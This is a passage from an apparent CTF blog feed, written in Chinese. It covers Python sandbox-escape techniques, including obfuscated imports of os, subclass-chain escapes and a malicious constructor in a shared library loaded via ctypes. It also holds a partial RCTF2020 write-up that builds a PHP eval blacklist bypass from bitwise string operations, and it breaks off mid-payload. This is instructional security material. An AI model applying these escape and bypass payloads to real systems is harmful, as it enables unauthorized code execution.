class="string">'2to3'</span>, <span class="string">'test'</span>, <span class="string">'bdb'</span>, <span class="string">'faulthandler'</span>, <span class="string">'pdb'</span>, <span class="string">'timeit'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'distutils'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sys'</span>, <span class="string">'sysconfig'</span>, <span class="string">'builtins'</span>, <span class="string">'__main__'</span>, <span class="string">'warnings'</span>, <span class="string">'dataclasses'</span>, <span class="string">'contextlib'</span>, <span class="string">'abc'</span>, <span class="string">'atexit'</span>, <span class="string">'traceback'</span>, <span class="string">'__future__'</span>, <span class="string">'gc'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'code'</span>, <span class="string">'codeop'</span>, <span class="string">'zipimport'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'runpy'</span>, <span class="string">'importlib'</span>, <span class="string">'parser'</span>, <span class="string">'ast'</span>, <span class="string">'symtable'</span>, <span class="string">'symbol'</span>, <span class="string">'token'</span>, <span class="string">'keyword'</span>, <span class="string">'tokenize'</span>, <span class="string">'tabnanny'</span>, <span class="string">'pyclbr'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'dis'</span>, <span class="string">'pickletools'</span>, <span class="string">'formatter'</span>, <span class="string">'msilib'</span>, <span class="string">'msvcrt'</span>, <span class="string">'winreg'</span>, <span class="string">'winsound'</span>, <span class="string">'posix'</span>, <span class="string">'pwd'</span>, <span class="string">'spwd'</span>, <span class="string">'grp'</span>, <span class="string">'crypt'</span>, <span class="string">'termios'</span>, <span class="string">'tty'</span>, <span class="string">'pty'</span>, <span class="string">'fcntl'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'_frozen_importlib'</span>, <span class="string">'_imp'</span>, <span class="string">'_warnings'</span>, <span class="string">'_frozen_importlib_external'</span>, <span class="string">'_io'</span>, <span class="string">'nt'</span>, <span class="string">'_weakref'</span>, <span class="string">'_codecs'</span>, <span class="string">'encodings.aliases'</span>, <span class="string">'encodings'</span>, <span class="string">'encodings.utf_8'</span>, <span class="string">'_signal'</span>, <span class="string">'encodings.latin_1'</span>, <span class="string">'_abc'</span>, <span class="string">'_stat'</span>, <span class="string">'_collections_abc'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>, <span class="string">'os.path'</span>, <span class="string">'_site'</span>]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line">res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    res[met] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> all_modules3:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m = __import__(module)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        attrs = dir(m)</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> attrs:</span><br><span class="line">            res[met].append(module)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met+<span class="string">":"</span>+str(res[met]))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">os</span>:<span class="selector-attr">[<span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'filecmp'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'dbm'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'plistlib'</span>, <span class="string">'secrets'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'asyncore'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'binhex'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'smtpd'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'gettext'</span>, <span class="string">'shlex'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'bdb'</span>, <span class="string">'pdb'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sysconfig'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'tabnanny'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'msilib'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>]</span></span><br><span class="line"><span class="selector-tag">subprocess</span>:<span class="selector-attr">[<span class="string">'asyncio'</span>, <span class="string">'webbrowser'</span>, <span class="string">'imaplib'</span>, <span class="string">'venv'</span>]</span></span><br></pre></td></tr></table></figure><p>也可以fuzz一下其他的方法比如 <code>sys</code>（<code>sys.modules[&quot;os&quot;].system(&quot;whoami&quot;)</code>），举一反三就行</p><ul><li><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>) //注意导入importlib</span><br></pre></td></tr></table></figure><p>  如果通过 <code>sys.modules[&#39;os&#39;] = None</code>,那么就无法导入 <code>os</code>但import 的原理，本质上就是执行一遍导入的库。路径可以通过 <code>sys.path</code>查看，默认都是在 <code>/usr/lib/python3X/</code></p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'/usr/lib/python3.8/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"><span class="keyword">system</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sys.modules[<span class="string">'os'</span>]= <span class="string">'/usr/lib/python3.8/os.py'</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">del sys.modules[<span class="string">'os'</span>] //当 <span class="keyword">import</span> 一个模块时：<span class="keyword">import</span> A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 <span class="keyword">module</span> 对象，并加载 A。所以删了 sys.modules[<span class="string">'os'</span>] 只会让 Python 重新加载一次 os。</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure></li><li><h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>  字符串拼接</p>  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure><p>  字符串逆转</p>  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span>(<span class="string">'so'</span>[::-<span class="number">1</span>])<span class="selector-class">.system</span>(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>  变量替换</p>  <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">a</span>=<span class="string">'o'</span></span><br><span class="line">b=<span class="string">'s'</span></span><br><span class="line">__import__(<span class="keyword">a</span>+b).<span class="keyword">system</span>(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure><p>  编码</p>  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>((<span class="variable">bytes.fromhex</span>(<span class="string">"6f73"</span>).decode())).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure><p>  别名</p>  <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure></li><li><h4 id="继承逃逸"><a href="#继承逃逸" class="headerlink" title="继承逃逸"></a>继承逃逸</h4><p>  python中万物皆对象。通过各种魔术函数可以在继承链上找到我们需要的函数。也可以通过脚本FUZZ一下</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里只爆破了一层</span></span><br><span class="line"><span class="comment"># object</span></span><br><span class="line"><span class="comment"># [].__class__.__base__</span></span><br><span class="line"><span class="comment"># "".__class__.__mro__[-1]</span></span><br><span class="line">methods=[<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line"></span><br><span class="line">classes = [].__class__.__base__.__subclasses__()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line"></span><br><span class="line">    res[met] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(classes)):</span><br><span class="line">        cla = str(classes[i])</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> cla:</span><br><span class="line">            res[met].append(str(i) + <span class="string">" "</span> + cla)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># dir() 不会列出内置函数和变量名称所以 exec和eval只能爆破，或者利用其他包的__builtins__调用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"__globals__"</span> <span class="keyword">in</span> dir(classes[i].__init__):</span><br><span class="line">            <span class="keyword">if</span> met <span class="keyword">in</span> classes[i].__init__.__globals__:</span><br><span class="line">                res[met].append(str(i)+ <span class="string">" "</span>+cla)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met + <span class="string">":"</span> + str(res[met]))</span><br></pre></td></tr></table></figure><p>  类的序号在不同的py版本，运行平台，以及import不同的包，都会造成<code>object</code>的子类数量不一样，序号也就不一样了。脚本也就构造下payload，远程打过去还得爆破序号。</p></li><li><h4 id="加载恶意so"><a href="#加载恶意so" class="headerlink" title="加载恶意so"></a>加载恶意so</h4><p>  利用<code>ctypes.LibraryLoader</code>加载恶意动态库执行命令。<code>ctypes</code>必须要导入，不然<code>object</code>不会有它。感觉有些鸡肋。</p><p>  evil.c</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ls -la  &gt; /tmp/ls_la"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  poc.py</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">167</span>](<span class="string">'/tmp/evil.so'</span>)</span><br></pre></td></tr></table></figure><p>  <img src="/2020/06/python-web学习/image-20200701212037508.png" alt="image-20200701212037508"></p></li><li><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>  过滤<code>[</code>、<code>]</code>，应对的方式就是将[]的功能用pop 、<code>__getitem__</code> 代替（实际上a[0]就是在内部调用了<code>a.__getitem__(0)</code> )</p><p>   <code>&#39;&#39;.__class__.__mro__.__getitem__(1).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</code></p></li></ul><ul><li><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>  <a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98" target="_blank" rel="noopener">沙盒逃逸备忘</a></p><p>  <a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python-沙箱逃逸</a></p><p>  <a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      填填坑
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="web" scheme="https://0xcreed.jxustctf.top/tags/web/"/>
    
      <category term="python" scheme="https://0xcreed.jxustctf.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2020-复现</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-06T16:48:00.000Z</published>
    <updated>2020-06-28T11:49:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-calc"><a href="#1-calc" class="headerlink" title="1.calc"></a>1.calc</h3><p>RoarCTF2020的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">easy_calc</a>的升级版,过滤了更多字符，但思路还是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>​    在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。所以我们可以先获得一部分字符然后位运算获取所有的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// .</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">//E</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;); <span class="comment">// +</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// N</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;); <span class="comment">// F</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"1"</span> | <span class="string">"E"</span>);<span class="comment">//u</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"3"</span> | <span class="string">"E"</span>); <span class="comment">// w</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"4"</span> | <span class="string">"I"</span>); <span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"I"</span>); <span class="comment">// y</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"F"</span>); <span class="comment">//v</span></span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/0J9Omna8tmKWP9s4iSg10w" target="_blank" rel="noopener">chamd5的构造脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">strings = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'u'</span>,<span class="string">'w'</span>,<span class="string">'&#125;'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'F'</span>,<span class="string">'y'</span>,<span class="string">'v'</span>]</span><br><span class="line"></span><br><span class="line">input_value = <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line"></span><br><span class="line">print(len(strings))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)&amp;ord(s1)))</span><br><span class="line">    data = data.strip()</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = (chr(ord(s)&amp;ord(s1))).strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = chr(~ord(s))</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  data = data.strip()</span><br><span class="line">  <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">    strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success ~'</span>,s)</span><br></pre></td></tr></table></figure><p>手工拼了个 <code>pHpINFo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">''</span>;</span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.= (((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//H=y&amp;N</span></span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">//N</span></span><br><span class="line">$a.= (((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//F=w &amp; N</span></span><br><span class="line">$a.= (((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;);<span class="comment">//o=E | +</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>完整的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span 